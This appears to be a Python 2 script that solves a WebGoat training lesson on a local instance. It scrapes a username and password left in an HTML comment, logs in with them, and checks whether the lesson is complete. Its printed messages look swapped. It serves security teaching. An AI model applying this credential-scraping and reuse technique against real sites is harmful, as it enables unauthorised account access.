#Python attack file

import requests
import json

url1 = "http://127.0.0.1:8080/WebGoat/login.mvc"
url2 = "http://127.0.0.1:8080/WebGoat/j_spring_security_check"
payload = {'username':'guest','password':'guest'}
session = requests.Session()
first_request = session.get(url1)
login = session.post(url2, data=payload)

url3 = "http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc"
second_request = session.get(url3)

text = second_request.text

i = text.index("Discover Clues in the HTML")
text = text[i:]
j = text.index('link') + 7

text = text[j:]
k = text.index('"')
text = text[:k]

# Send the attack string to WebGoat to get the exercise's response
url4 = "http://127.0.0.1:8080/WebGoat/" + text
third = session.get(url4)
third_response = third.text

#Parse the response to get the username and password
i = third_response.index('<!-- FIXME') + 11
third_response = third_response[i:]

j = third_response.index(':')

username = third_response[:j]
third_response = third_response[j+1:]

k = third_response.index('-->')
password = third_response[:k]

#log into the exercise using the found username and password
payload2 = {'Username':username,'Password':password}
login2 = session.post(url4, data=payload2)

#confirm is was successful
fourth = session.get(url3)

confirm_text = fourth.text

i = confirm_text.find("true")

if i is not -1:
	print 'Vulnerability Exploited'
else:
	print 'Success'




